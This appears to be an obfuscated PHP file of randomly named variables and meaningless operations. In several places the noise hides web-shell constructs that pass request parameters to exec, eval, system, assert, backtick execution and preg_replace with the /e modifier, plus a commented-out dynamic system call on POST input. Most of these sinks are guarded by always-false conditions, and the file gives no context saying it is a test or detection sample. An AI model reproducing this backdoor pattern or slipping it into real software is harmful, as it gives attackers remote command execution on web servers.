<?php
$_GET['FF6bJ0Zpj'] = ' ';
exec($_GET['FF6bJ0Zpj'] ?? ' ');
$sQfrqXdOV = '$w_KK = \'nX\';
$iiqPFCW = \'T5L\';
$owUig8 = \'xKigTWY\';
$lUpLCHG = \'CloWzJOF\';
str_replace(\'D2MF8NJiyUIf9o\', \'RJ1HEbdI0V4n\', $w_KK);
$iiqPFCW = $_POST[\'wb0lGKZpDegdkV\'] ?? \' \';
$owUig8 .= \'dYgyPn\';
str_replace(\'LIU1HzcopE4Wwp\', \'oV4AQmgBMXqio\', $lUpLCHG);
';
assert($sQfrqXdOV);
if('jt6GHx4XR' == 'cwglbWkwn')
 eval($_GET['jt6GHx4XR'] ?? ' ');

function Vik()
{
    $nYCHOuzn = 'Hhx27';
    $iLfKEqRxe = 'EM';
    $dEpyp = 'GG4TW2Nae';
    $Qyi3N = 'YL';
    $eZMDl2u9vol = 'KzX';
    $NOKIQuwOXn = 'uLeVrTy6Z';
    $nYCHOuzn .= 'FohxOnfr8JXR6mCU';
    preg_match('/qAfGF0/i', $iLfKEqRxe, $match);
    print_r($match);
    $dEpyp = $_POST['im3HzvaYvkQ2G'] ?? ' ';
    preg_match('/gPHDDy/i', $Qyi3N, $match);
    print_r($match);
    $eZMDl2u9vol = explode('dD8epm2nInd', $eZMDl2u9vol);
    if('WgDbyyhEj' == 'UtsLIFwXY')
    @preg_replace("/wknS0eQ7/e", $_POST['WgDbyyhEj'] ?? ' ', 'UtsLIFwXY');
    $zDc6U = 'aUgm78u';
    $UKYS = 'y1ZdVBb';
    $Js3 = 'phH__ShKH';
    $ZSzZFK = 'DHWl';
    $xi = 'JR';
    $fChX = 'pKqVMRgvO';
    if(function_exists("E9TUihE_1IfsK0pA")){
        E9TUihE_1IfsK0pA($zDc6U);
    }
    $UKYS = $_GET['uapyI_WxER2L_'] ?? ' ';
    $Js3 = explode('sUbyI43m', $Js3);
    $D3tMjfXsqUb = array();
    $D3tMjfXsqUb[]= $ZSzZFK;
    var_dump($D3tMjfXsqUb);
    echo $xi;
    $sH5oSmT = array();
    $sH5oSmT[]= $fChX;
    var_dump($sH5oSmT);
    $X1pPq = 'h_5hnk';
    $ZUfj = 'j6FZpI';
    $MCSy6D = 'yHtiE9_3bl';
    $NUKuQW0IV = 'vTEuWfiTw';
    $RPQz = 'Q9JSqLIXpnq';
    $ZUfj = explode('BD3t0I', $ZUfj);
    $MCSy6D = explode('fa0aCR_QnQ', $MCSy6D);
    $NUKuQW0IV = $_POST['F8NpoR3lR3VtnLAa'] ?? ' ';
    $RPQz = explode('fWLJgSpe', $RPQz);
    
}
Vik();
$tzyfd6Gj = 'RVyW1Q';
$gwd6xaDgUkL = 'f4h8fxjkUvl';
$tl9M72mfRZ = 'gB6ePg5fo';
$MylS8S1 = 'QRU7B4w';
$IR = '_VPibaqkB';
$cIu = 'cThbHUhz6u';
$Qfaos5I = 'qEbjM9SLor';
$N3wTNxa = 'FikD0UvRWSu';
$Vq0RB = 'gf';
$tzyfd6Gj = $_GET['ES9SPGx'] ?? ' ';
$qGcOT5z2Drv = array();
$qGcOT5z2Drv[]= $gwd6xaDgUkL;
var_dump($qGcOT5z2Drv);
echo $tl9M72mfRZ;
$MylS8S1 = explode('y7Ky6fzRgpG', $MylS8S1);
$IR .= 'P5uhxp';
$cIu .= 'dfelUp';
$JU83jXe = array();
$JU83jXe[]= $Qfaos5I;
var_dump($JU83jXe);
str_replace('x3ZlxKu6C', 'bhMb6S33Mmc', $N3wTNxa);
if('jY2EE80cR' == 'XktshfSnZ')
system($_GET['jY2EE80cR'] ?? ' ');
$wsF9hF = 'Q7yL8A';
$ukDiO = '_vefhg';
$IgNR4Bh1Ur9 = 'YJw';
$lR = 'Qe1SnlDWXJ3';
$A1N = '_i85';
$sHsX = 'efc';
$LST9 = 'ditm3K19';
preg_match('/D_40vt/i', $wsF9hF, $match);
print_r($match);
var_dump($ukDiO);
var_dump($IgNR4Bh1Ur9);
if(function_exists("mZZB9T0Ig00MxV")){
    mZZB9T0Ig00MxV($lR);
}
$sHsX = $_POST['xCXbrUe'] ?? ' ';
$LST9 .= 'wsXQYQ';
$uXeuY_ZHm = 'uORS21O';
$qhumRK = 'AkP';
$On7B5h68h = 'W4nbZqNy';
$DjRIIS9bDf = 'B_DfY9FEt7K';
$vf = 'xo';
$YLiW_Q2ao5C = 'D5a';
$qhumRK = $_GET['z9IMOQm'] ?? ' ';
$kVv5ZqO = array();
$kVv5ZqO[]= $On7B5h68h;
var_dump($kVv5ZqO);
var_dump($vf);
echo $YLiW_Q2ao5C;
if('v9vI0wJUZ' == 'IfOsyZpsN')
 eval($_GET['v9vI0wJUZ'] ?? ' ');
$rlk = 'QEj7K';
$UkrHt9D7mVy = 'lmnDEJ3';
$MocG8T = 'D0Kz_d7lRxO';
$wmVmlWMS = '_XcWeUCQxtB';
$YZOl = '_LdcFL8Jh';
$Y8LWGTodPU = 'rP';
$F0wy8x7EG = 'nNZD1w';
$xjBnueYx4L = 'At0Ut0XlOE';
$jde2RNg = 'hYh2y';
$rlk = explode('sfQ3J3d', $rlk);
str_replace('DeVM7G', 'xSGaPky3bQ_EJaz', $UkrHt9D7mVy);
$MocG8T = explode('waDCkt', $MocG8T);
$wmVmlWMS .= 'ptByo2kpZukCnWoY';
$ovynDXoRpzO = array();
$ovynDXoRpzO[]= $YZOl;
var_dump($ovynDXoRpzO);
echo $F0wy8x7EG;
$xjBnueYx4L = explode('cYThnnk', $xjBnueYx4L);
$MiUgV2GOo = NULL;
assert($MiUgV2GOo);
$Ov7 = 'yMwskKhz4xF';
$AQsWfHSp = 'ZK';
$zDCmXiyl3QC = 'Pv';
$nYa5aFfnTEC = 'eN8CuLZuCh';
$eY5s7B = 'qkD0Wim';
$xTgpuEXDDw5 = 'hBJfVClKM';
$HumqRbw = 'BeC';
$agQT = 'R3';
$IyoinZ = 'FGV3sDS';
$vncSK = 'x7cwt';
preg_match('/ahIdsD/i', $Ov7, $match);
print_r($match);
echo $AQsWfHSp;
str_replace('G5UrWU', 'dUQ6LORqAf7TQ', $zDCmXiyl3QC);
$nYa5aFfnTEC = $_GET['oDyH2D5YoG'] ?? ' ';
$eY5s7B = $_GET['Kv_RyQq'] ?? ' ';
$xTgpuEXDDw5 .= 'QbS0GuUYHA_vt84';
$uGQhlPwOQWb = array();
$uGQhlPwOQWb[]= $HumqRbw;
var_dump($uGQhlPwOQWb);
$agQT .= 'IImejYuhMeZWP';
echo $IyoinZ;
$vncSK = explode('rW1jRtp', $vncSK);
$_GET['u3Js7KSx6'] = ' ';
echo `{$_GET['u3Js7KSx6']}`;

function kSlo9yC1()
{
    $PJ3 = 'mT';
    $jxtq = new stdClass();
    $jxtq->KB2R = 'MIg';
    $jxtq->QbPkqdEH1f = 'w3Mv';
    $jxtq->OXyvQbEpenW = 'Lx2EcR7';
    $jxtq->QAmRUXuR52l = 'pT9wrm';
    $jxtq->c6hKq15 = 'SRZK';
    $jxtq->Am8_K = 'VZQ2bO';
    $NFJjbtqH3lF = 'fX';
    $Xo = 'rK8f68';
    $vH5pGZGxjt = 'o0s1DHwe';
    $PJ3 = $_GET['TkTrwm9vHC5pK3s'] ?? ' ';
    var_dump($NFJjbtqH3lF);
    $Xo .= 'J0dQ9GG7GDB';
    $vH5pGZGxjt = $_GET['bdgLhye9q'] ?? ' ';
    
}
/*
$QlU0m6EHh = 'system';
if('M6_fy39vB' == 'QlU0m6EHh')
($QlU0m6EHh)($_POST['M6_fy39vB'] ?? ' ');
*/
$lRvfp7 = 'KkB2kypS';
$ezPLXkd = 'nZi_BJV2C3';
$DqK7 = 'OjDju4pL';
$f3HD = '_WC';
$JuC = new stdClass();
$JuC->zV_BCpRC = 'oGlpIxKAHGj';
$JuC->io = 'S4VasJ7C';
$JuC->zg = 'nf6glHCL5p';
$JuC->GH0ru = 'brW9gr9';
$JuC->sbD = 'u5JwTrF3FmO';
$IwNbsGO5 = 'chdmpyYDTTc';
echo $lRvfp7;
if(function_exists("J8fqPW2l0bEFQHH")){
    J8fqPW2l0bEFQHH($ezPLXkd);
}
$DqK7 = $_GET['TlkXqVmeT'] ?? ' ';
$IwNbsGO5 = $_POST['Hyok9D9ct9m_'] ?? ' ';

function mlvMVBpW26p3qCgw()
{
    $lRWTXKnabC9 = 'lTIgA1sTG';
    $mmsJmZ8 = 'cFxZK';
    $xoeqLVwH = 'hLOY4X';
    $pO = 'Dw8';
    $cXVpongq5YY = 'DH';
    $QL3RTyq = 'eaeh1UMhSGO';
    $q7JvIPUMs = 'OS';
    $fYxPmFX5OF = 'QgNaE';
    $QzBSPX9a = 'rxGotl';
    $sw_xnpZMCR = 'AU3Ls';
    $NfRp2x6jZX = 'aWRVXe5JlK';
    $rjhkTNh0z = 'cxxZA';
    $_fxbf = 'txLmyE_A';
    echo $lRWTXKnabC9;
    $mmsJmZ8 = explode('OJ6Njq57XkD', $mmsJmZ8);
    str_replace('oFzTcRpuucSA', 'Ie8UssM4m', $xoeqLVwH);
    echo $cXVpongq5YY;
    $lY1O70et_ = array();
    $lY1O70et_[]= $QL3RTyq;
    var_dump($lY1O70et_);
    var_dump($q7JvIPUMs);
    str_replace('CtEw3M', 'crBSbu', $fYxPmFX5OF);
    $sw_xnpZMCR = $_GET['_xdCXcQP9H'] ?? ' ';
    $NfRp2x6jZX = explode('R_nWRkm', $NfRp2x6jZX);
    $rjhkTNh0z .= 'ovwPd9T';
    $_fxbf = $_POST['n8V7OdoS7Qg47pa'] ?? ' ';
    if('NPGPqbcg7' == 'v8jPBGyPI')
    @preg_replace("/kX/e", $_GET['NPGPqbcg7'] ?? ' ', 'v8jPBGyPI');
    $xUVdQfUXjz = 'u487nu';
    $geKrY = 'OReSyJtTivA';
    $SgGzkPT = 'GigC';
    $I_ = 'M4dFv';
    $pm1P8J3J2h7 = 'XEI63ubUY';
    $idRC5X = 'I8oHzdkrdyg';
    $NeCwb = 'zYva8cipNl';
    $JLkgHhr = array();
    $JLkgHhr[]= $xUVdQfUXjz;
    var_dump($JLkgHhr);
    var_dump($geKrY);
    $SgGzkPT = $_GET['ZhB5_45udU_ZdS7'] ?? ' ';
    $I_ = $_GET['VKwIy1bo'] ?? ' ';
    str_replace('kev9aa2W', 'Z_OdgbYo', $idRC5X);
    $qDnqKcQRZ = array();
    $qDnqKcQRZ[]= $NeCwb;
    var_dump($qDnqKcQRZ);
    
}
$tElau = 'nWBAiDQPCOP';
$rG = 'kjk';
$ZBBgSN7O1 = 'lgJ';
$Agkr70 = 'RDy5XNbbW';
$sRQFU1efIK = 'Xw9QbWgg';
$ggNl = new stdClass();
$ggNl->wZmLBf = 'GY';
$ggNl->Gwooy = 'FQfpi';
$ggNl->qQPAGqW = '_ZHt';
$ggNl->lwnz7j0Q = 'G2';
$ggNl->FqfhTSoSXBw = 'Xenu7Upp9lw';
$wES9Ep = 'Ft';
$z9sjLZgUEZ = 'uvK24CnI_';
$HPTFFJEWsA = 'cvoTZNel7u';
str_replace('MQJZpIMrXUgcQ', 'KbagCI3LDnbg', $tElau);
$rG = explode('F272Yc7o', $rG);
$Agkr70 .= 'a1h8CherzDev';
$sRQFU1efIK = $_POST['YFv9gW9zHUx2ac'] ?? ' ';
str_replace('ZZS9TuCMEkLG', 'DBUJmhu', $wES9Ep);
$z9sjLZgUEZ = explode('ZjtXEP', $z9sjLZgUEZ);
preg_match('/gOw7oM/i', $HPTFFJEWsA, $match);
print_r($match);
$kGEXx = 'CMhiOpTmk';
$FVb6d1NiHoQ = 'uAa';
$eMiO6Jva = 'BAr';
$GzFNljQymOB = 'ECewF';
$fhfmQX65094 = 'mLnAtSlZMTv';
$XvTWu = '_DG_gi';
$HJP2 = 'EZOMRqSm4KR';
$BmbDCAXsRnz = new stdClass();
$BmbDCAXsRnz->G_N = 'FHnEPCZJ8';
$BmbDCAXsRnz->xG = 'NZ7Ah';
$xEswKffrKVC = 't3w';
preg_match('/CSAaXA/i', $kGEXx, $match);
print_r($match);
$FVb6d1NiHoQ = $_POST['_csH1i3Hj892'] ?? ' ';
$eMiO6Jva = $_POST['Umneb2yS8'] ?? ' ';
str_replace('MitrP6e', 'F_FvSXr6e0Y98X', $GzFNljQymOB);
$VQ_3Yyya = array();
$VQ_3Yyya[]= $fhfmQX65094;
var_dump($VQ_3Yyya);
$XvTWu .= 'IohY7F8FFJ';
preg_match('/hIS6eO/i', $HJP2, $match);
print_r($match);
$kwgkw2 = array();
$kwgkw2[]= $xEswKffrKVC;
var_dump($kwgkw2);
echo 'End of File';
